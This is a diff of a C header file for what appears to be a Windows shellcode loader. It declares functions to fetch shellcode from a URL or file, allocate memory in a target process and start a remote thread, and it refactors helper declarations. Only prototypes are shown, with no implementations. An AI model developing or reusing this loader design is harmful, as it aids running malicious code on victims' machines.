@@ -10,36 +10,18 @@
 #define STATUS_SUCCESS				0x00000000
 #define STATUS_INFO_LENGTH_MISMATCH 0xC0000004
 
-enum PROCESS_ENUM
-{
-	SNAPSHOT,
-	ENUMPROCESSES,
-	NTQUERYSYSTEMINFORMATION
-};
-
-enum ALERTABLE_FUNCTIONS
-{
-	SLEEPEX,
-	WAITFORSINGLEOBJECTEX,
-	WAITFORMULTIPLEOBJECTSEX,
-	MSGWAITFORMULTIPLEOBJECTSEX,
-	SIGNALOBJECTANDWAIT
-};
-
-enum MEMORY_TYPE
-{
-	PRIVATE,
-	MAPPED
-};
 
 typedef NTSTATUS(NTAPI* fnNtQuerySystemInformation)(
 	SYSTEM_INFORMATION_CLASS SystemInformationClass,
 	PVOID SystemInformation,
 	ULONG SystemInformationLength,
 	PULONG ReturnLength
-	);
+);
 
 //HelperFunctions.c
+BOOL ReportErrorWinAPI(char* ApiName);
+BOOL ReportErrorNTAPI(char* ApiName, NTSTATUS STATUS);
+BOOL ConvertToLowerCase(IN LPCWSTR lpszInput, OUT LPWSTR* pOutput);
 void AlertableSleepEx();
 void AlertableWaitForSingleObjectEx();
 void AlertableWaitForMultipleObjectsEx();
@@ -57,8 +39,7 @@ BOOL ReadShellcodeFromURL(IN LPCSTR lpUrl, OUT PVOID* pShellcode, OUT SIZE_T* sS
 BOOL FetchShellcode(IN LPCSTR lpShellcodePath, OUT PVOID* pShellcode, OUT SIZE_T* sShellcodeSize);
 
 // Internals.c
-BOOL ReportErrorWinAPI(char* ApiName);
-BOOL ConvertToLowerCase(IN LPCWSTR lpszInput, OUT LPWSTR* pOutput);
+BOOL ObtainWinAPIAddress(IN LPCSTR lpDllName, IN LPCSTR lpFunctionName, OUT PVOID* pAddress);
 BOOL AllocateMemory(IN DWORD dwType, IN HANDLE hProcess, IN PVOID pShellcode, IN SIZE_T sShellcodeSize, OUT PVOID* pShellcodeAddr);
 BOOL RunThread(IN HANDLE hProcess, IN BOOL bSuspended, IN PVOID pShellcode, OUT HANDLE* hThread, OUT DWORD* dwThreadId);
 BOOL WaitForThread(IN HANDLE hThread);
